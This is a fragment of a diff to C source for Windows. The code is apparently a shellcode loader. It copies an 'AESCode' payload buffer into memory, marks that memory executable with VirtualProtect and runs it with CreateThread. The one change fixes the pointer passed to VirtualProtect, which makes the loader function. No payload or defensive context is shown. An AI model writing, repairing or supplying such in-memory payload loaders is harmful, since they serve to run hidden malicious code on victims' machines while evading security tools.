@@ -43,7 +43,7 @@ int main() {
 
     memcpy(camllo, AESCode, AESCodeLen);
     DWORD oldProtect;
-    VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);
+    VirtualProtect(camllo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);
 
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)camllo, NULL, 0, NULL);
     WaitForSingleObject(tHandle, INFINITE);
